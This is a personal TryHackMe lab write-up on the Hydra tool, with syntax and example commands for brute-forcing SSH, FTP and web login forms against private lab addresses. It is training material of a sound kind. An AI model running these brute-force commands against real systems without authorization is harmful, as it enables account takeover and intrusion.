
````markdown
# 🐉 Hydra – Credential Brute-Forcing Lab

## 📄 Overview
This lab from TryHackMe demonstrates the use of **Hydra**, a tool for brute-forcing credentials on various authentication services such as **SSH, FTP, SNMP, and web applications**.  
It was completed in a controlled, authorized environment as part of my hands-on cybersecurity training.

---

## 📌 Objective
- Learn how to perform credential brute-forcing on multiple protocols.
- Understand Hydra syntax and its key options.
- Practice attacking SSH, FTP, and POST-based web forms.
- Interpret failed login responses for successful automation.

---

## 🛠 Tools Used
- **Hydra** – Credential brute-force tool  
- **Wordlists** – For testing possible passwords  
- **Kali Linux** – Attack platform  

---

## 🔍 Commands & Usage

### FTP
```bash
hydra -l user -P <filename> ftp://<IP_ADDRESS>
````

### SSH

```bash
hydra -l <username> -P <wordlist> <IP_ADDRESS> -t 4 ssh
```

**Options:**

* `-l` → Single username
* `-P` → Password list
* `-t` → Number of threads

---

## 🌐 POST Web Form

**Syntax:**

```bash
sudo hydra <username> -P <wordlist> <IP_ADDRESS> \
http-post-form "/<path>:username=^USER^&password=^PASS^:<invalid_response>" -v
```

**Parameters:**

* `http-post-form` → Indicates POST request type
* `<path>` → Login page URL path
* `<login_credentials>` → Fields for username and password
* `<invalid_response>` → Response text when login fails
* `-v` → Verbose mode

---

**1. SSH Brute Force**

```bash
hydra -l admin -P passwords.txt 10.10.10.5 -t 4 ssh
```

**2. FTP Brute Force**

```bash
hydra -l testuser -P rockyou.txt ftp://10.10.10.8
```

**3. Web Form Brute Force**

```bash
hydra -l admin -P wordlist.txt 10.10.10.6 \
http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v
```

---

## 📚 What I Learned

* How to configure and execute Hydra attacks on multiple services.
* The importance of selecting efficient **wordlists**.
* How to identify **failure messages** for web form brute-forcing.
* Balancing speed and detection with the `-t` option.
* Reinforcing the principle of **ethical hacking**: only perform testing in authorized environments.

---



